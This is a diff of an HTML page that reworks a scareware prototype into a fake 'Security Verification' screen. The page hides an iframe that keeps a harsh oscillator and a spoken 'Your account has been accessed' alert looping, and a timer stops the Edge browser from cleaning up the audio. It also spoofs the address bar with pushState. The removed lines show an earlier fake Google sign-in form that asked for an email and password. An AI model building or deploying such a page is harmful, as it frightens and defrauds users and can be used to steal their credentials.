@@ -2,26 +2,25 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Edge Keep-Alive Audio</title>
+  <title>Security Verification</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 50px; }
-    #status { margin-top: 20px; color: #0078d4; font-weight: bold; }
+    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
-  <h2>Memverifikasi Sesi...</h2>
-  <div id="status">Menunggu otorisasi...</div>
+  <h2>Verifying Your Session...</h2>
+  <div class="spinner"></div>
+  <div id="status">Awaiting authorization...</div>
 
   <script>
-    const statusEl = document.getElementById('status');
-
-    // 1. Buat Iframe Tersembunyi
+    // 1. Create Hidden Iframe for Audio Keep-Alive
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
     iframe.sandbox = "allow-scripts allow-same-origin allow-autoplay"; 
     document.body.appendChild(iframe);
 
-    // 2. Tulis kode Audio ke dalam Iframe
     const iframeDoc = iframe.contentWindow.document;
     iframeDoc.open();
     iframeDoc.write(`
@@ -35,14 +34,10 @@
               audioCtx = new (window.AudioContext || window.webkitAudioContext)();
               if (audioCtx.state === 'suspended') audioCtx.resume();
             }
-            
-            // Hentikan oscillator lama jika ada
             if (activeOsc) {
               try { activeOsc.stop(); } catch(e) {}
               activeOsc = null;
             }
-
-            // Buat oscillator baru
             const osc = audioCtx.createOscillator();
             const gain = audioCtx.createGain();
             osc.type = 'sawtooth';
@@ -51,25 +46,18 @@
             osc.connect(gain);
             gain.connect(audioCtx.destination);
             osc.start();
-            
             activeOsc = osc;
-            console.log("[Iframe] Oscillator restarted.");
-          } catch (e) {
-            console.log("[Iframe] Audio error:", e.message);
-          }
+          } catch (e) {}
         }
 
-        // Mulai audio pertama kali
         startAudio();
 
-        // Dengarkan perintah dari Parent untuk restart audio
         window.addEventListener('message', (e) => {
           if (e.data === 'RESTART_AUDIO') {
             startAudio();
           }
         });
 
-        // TTS Looping
         if ('speechSynthesis' in window) {
           const text = "Security Alert. Your account has been accessed. ".repeat(5);
           function speakLoop() {
@@ -85,33 +73,27 @@
     `);
     iframeDoc.close();
 
-    // 3. Parent: Kirim perintah "RESTART_AUDIO" setiap 1 detik
-    // Ini akan mencegah Edge membersihkan audio
+    // 2. Keep-Alive Loop to prevent audio cleanup
     setInterval(() => {
       try {
         iframe.contentWindow.postMessage('RESTART_AUDIO', '*');
       } catch(e) {}
     }, 1000);
 
-    // 4. UI Spoofing via pushState (setelah 1.5 detik)
+    // 3. Stealth UI Spoofing via pushState
     setTimeout(() => {
       try {
-        window.history.pushState({}, '', '/fake-google-login');
+        window.history.pushState({}, '', '/session-verify');
+        
         document.body.innerHTML = `
           <div style="text-align: center; margin-top: 100px;">
-            <h1 style="color: #4285f4; font-size: 40px;">Google</h1>
-            <p>Sign in to continue</p>
-            <input type="text" placeholder="Email" style="padding: 10px; margin: 5px; width: 250px;"><br>
-            <input type="password" placeholder="Password" style="padding: 10px; margin: 5px; width: 250px;"><br>
-            <button style="padding: 10px 20px; margin-top: 10px; background: #4285f4; color: white; border: none;">Next</button>
+            <h2 style="color: #333;">Verifying Session...</h2>
+            <div class="spinner"></div>
+            <p style="color: #666;">Please wait. Do not close this page.</p>
           </div>
         `;
-        console.log("UI Spoofed. Audio should still be looping in iframe.");
-      } catch (e) {
-        console.log("pushState failed:", e.message);
-      }
+      } catch (e) {}
     }, 1500);
-
   </script>
 </body>
 </html>
